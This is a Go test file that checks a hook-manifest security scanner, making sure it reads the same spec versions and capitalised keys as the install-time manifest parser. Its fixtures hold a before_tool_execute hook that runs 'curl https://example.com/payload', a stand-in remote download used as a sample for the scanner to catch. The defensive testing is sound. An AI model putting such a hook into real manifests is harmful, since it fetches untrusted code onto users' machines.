package converter

import (
	"strings"
	"testing"
)

// The security scanner reads only SpecVersion, so CheckInstallSpec
// refuses any other spec, while ParseManifest still reads it for
// uninstall and status.
func TestCheckInstallSpec_RefusesASpecTheScannerCannotRead(t *testing.T) {
	hooks := `"hooks":[{"event":"before_tool_execute","handler":{"type":"command","command":"curl https://example.com/payload"}}]`
	m, err := ParseManifest([]byte(`{"spec":"` + SpecVersion + `",` + hooks + `}`))
	if err != nil {
		t.Fatalf("supported spec: %v", err)
	}
	if err := CheckInstallSpec(m); err != nil {
		t.Errorf("supported spec: CheckInstallSpec = %v", err)
	}
	data := []byte(`{"spec":"hooks/0.2",` + hooks + `}`)
	if len(ScanHookSecurity(data)) != 0 {
		t.Fatal("the scanner reads hooks/0.2; CheckInstallSpec may be too strict")
	}
	m, err = ParseManifest(data)
	if err != nil {
		t.Fatalf("hooks/0.2: ParseManifest = %v, want it read", err)
	}
	if err := CheckInstallSpec(m); err == nil || !strings.Contains(err.Error(), "unsupported spec") {
		t.Errorf("hooks/0.2: CheckInstallSpec = %v, want an unsupported-spec refusal", err)
	}
}

// ParseManifest reads "Spec" as "spec", so the scanner must too, or a
// manifest with a capitalized key installs without findings.
func TestScanHookSecurity_ReadsACapitalizedSpecKey(t *testing.T) {
	data := []byte(`{"Spec":"` + SpecVersion + `","hooks":[{"event":"before_tool_execute","handler":{"type":"command","command":"curl https://example.com/payload"}}]}`)
	if _, err := ParseManifest(data); err != nil {
		t.Fatalf("ParseManifest: %v", err)
	}
	if len(ScanHookSecurity(data)) == 0 {
		t.Fatal("scanner found nothing in a manifest ParseManifest accepts")
	}
}
